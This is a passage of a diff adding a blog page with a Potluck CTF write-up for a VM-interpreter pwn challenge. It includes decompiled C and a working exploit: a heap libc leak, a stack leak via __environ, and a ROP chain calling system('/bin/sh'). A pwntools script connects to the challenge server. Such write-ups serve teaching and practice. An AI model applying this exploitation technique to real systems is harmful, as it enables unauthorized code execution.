+    <span class="n">local_58</span> <span class="o">=</span> <span class="n">strtok_r</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_68</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>I’ll spare you the details. Basically the function looks for a line “thread” to create a new thread and then it will run the following instructions we give it. The instructions are transformed into bytecode in the <code class="language-plaintext highlighter-rouge">generate_mcode</code> function. Those are my notes from all the instructions:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print r0 0x123 0x123
+alloc r0 size
+copy r0 r1 offset
+read r0 r1 offset
+write r0 r1 offset
+add r0, 0x123
+# shl, shr, mov, etc is the same
+lock
+unlock 0x123
+pause
+mov2 r0 r1
+# other inst2 are the same
+</code></pre></div></div>
+
+<p>We don’t get an instruction go get an input from the user so the exploit will need to be written fully in those instructions. What alloc does is it allocates memory on the heap and then stores the address in a register we give it. It also stores the length of the allocation in <code class="language-plaintext highlighter-rouge">regs[arg1+0xc]</code> and it looks like the code for instructions like write and read checks this length, but the checking does not matter and is very easy to avoid.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">case</span> <span class="mh">0xb</span><span class="p">:</span>
+                    <span class="cm">/* alloc */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">arg2</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Error: Runtime Error</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x15</span><span class="p">);</span>
+          <span class="n">err</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="n">pvVar2</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">arg2</span><span class="p">);</span>
+        <span class="n">regs</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">pvVar2</span><span class="p">;</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">undefined4</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">regs</span> <span class="o">+</span> <span class="p">(</span><span class="n">arg1</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">regs</span><span class="p">[</span><span class="n">arg1</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg2</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">regs</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Error: Runtime Error</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x15</span><span class="p">);</span>
+          <span class="n">err</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+	  <span class="k">case</span> <span class="mh">0xc</span><span class="p">:</span>
+                    <span class="cm">/* write */</span>
+        <span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">regs</span> <span class="o">+</span> <span class="p">(</span><span class="n">arg1</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+           <span class="p">((</span><span class="n">arg3</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">regs</span><span class="p">[</span><span class="n">arg1</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">]</span> <span class="o">-</span> <span class="mi">8U</span><span class="p">))</span> <span class="p">{</span>
+          <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">regs</span><span class="p">[</span><span class="n">arg1</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="n">arg3</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span> <span class="o">=</span> <span class="n">regs</span><span class="p">[</span><span class="n">arg2</span><span class="p">];</span>
+        <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+          <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">"Error: Runtime Error</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x15</span><span class="p">);</span>
+          <span class="n">err</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>For example we can just do arithmetical operations on the address stored in r0 and the program doesn’t care and this is what I will do in the exploit. So let’s get to exploiting! I’ll be adding additional comments but they are not a part of the exploit.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    alloc r0 100  # Allocate memory on the heap and store it in r0
+    sub r0 2d0  # Calculate offset to a place on the heap where an address to libc is stored
+    read r0 r0 0  # Read this address to r0
+</code></pre></div></div>
+
+<p>First we get a libc leak from the heap. Because we’re not operating on the main arena from ptmalloc cuz it’s multithreaded, glibc stores a pointer to the main arena at the beginning of our second arena and it just so happens that main arena is located inside of libc. If you have no idea what I’m talking about <a href="https://sourceware.org/glibc/wiki/MallocInternals">this is a good article about ptmalloc’s internals</a>. The rest of the exploit:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    add r0 7580  # Calculate offset inside of libc to a stack address. In this case it's `__environ` but there are a lot of stack addresses inside of libc.
+    mov2 r1 r0  # Make a copy of the libc address inside of r1. We will use it while creating a rop chain.
+    read r0 r0 0  # Read the stack address into r0
+    sub r0 158  # Calculate offset to the return address
+    sub r1 1f6e1b  # Calculate offset to the first gadget `pop rdi`
+    write r0 r1 0  # Write the gadget into the return address
+    add r0 8  # Add 8 to the stack address to continue writing the rop chain
+    add r1 1ae293  # Calculate offset to the string `/bin/sh\x00` inside of libc
+    write r0 r1 0  # Write it to the stack
+    add r0 8
+    sub r1 1878dc  # Calculate offset to a `ret` gadget so the stack is alligned while calling `system` later
+    write r0 r1 0
+    add r0 8
+    sub r1 2c  # Calculate offset to the beginning of the `system` function
+    write r0 r1 0
+</code></pre></div></div>
+
+<p>Then when the threads finish executing we return from called functions and our rop chain is executed resulting in a shell. There is the whole exploit code:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./myP1G_dbg_patched"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ld-linux-x86-64.so.2"</span><span class="p">)</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'split_emacsclient.fish'</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"challenge21.play.potluckctf.com"</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="s">'stdout'</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">api</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s">"""
+            set follow-fork-mode parent
+            b vm
+            """</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="s">'stdout'</span><span class="p">])</span>
+            <span class="c1">#gdb.attach(io)
+</span>    <span class="k">return</span> <span class="n">io</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+    <span class="n">send</span> <span class="o">=</span> <span class="s">"""
+    thread
+    alloc r0 100
+    sub r0 2d0
+    read r0 r0 0
+    add r0 7580
+    mov2 r1 r0
+    read r0 r0 0
+    sub r0 158
+    sub r1 1f6e1b
+    write r0 r1 0
+    add r0 8
+    add r1 1ae293
+    write r0 r1 0
+    add r0 8
+    sub r1 1878dc
+    write r0 r1 0
+    add r0 8
+    sub r1 2c
+    write r0 r1 0
+    """</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">send</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/ctf/rev/pwn/c/emacs/2023/12/29/Potluck-CTF-Writeups.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">poni&#39;s blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">poni&#39;s blog</li><li><a class="u-email" href="mailto:poniponiponiponiponiponiponiponiponiponi@protonmail.com">poniponiponiponiponiponiponiponiponiponi@protonmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/poniponiponiponiponiponiponiponiponi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">poniponiponiponiponiponiponiponiponi</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>My tech blog where I write about things I find interesting. Mostly low level programming, linux and ctf competitions.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
